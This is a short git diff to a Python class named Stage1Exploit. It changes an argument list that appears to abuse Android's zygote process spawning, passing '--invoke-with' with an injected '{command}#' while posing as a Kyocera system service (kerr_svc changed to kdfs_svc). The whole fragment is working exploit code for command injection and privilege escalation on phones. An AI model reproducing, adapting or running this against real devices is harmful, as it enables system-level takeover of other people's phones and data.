@@ -191,11 +191,8 @@ class Stage1Exploit:
             "--setgid=1000",
             "--setgroups=3003",
             "--runtime-args",
-            "--seinfo=platform:isSystemServer:kerr_svc:targetSdkVersion=28:complete",
-            "--runtime-flags=2049",
-            "--mount-external-default",
-            "--nice-name=jp.kyocera.kerr",
-            "--app-data-dir=/data/data/jp.kyocera.kerr",
+            "--seinfo=platform:isSystemServer:kdfs_svc:targetSdkVersion=28:complete",
+            "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
         ]
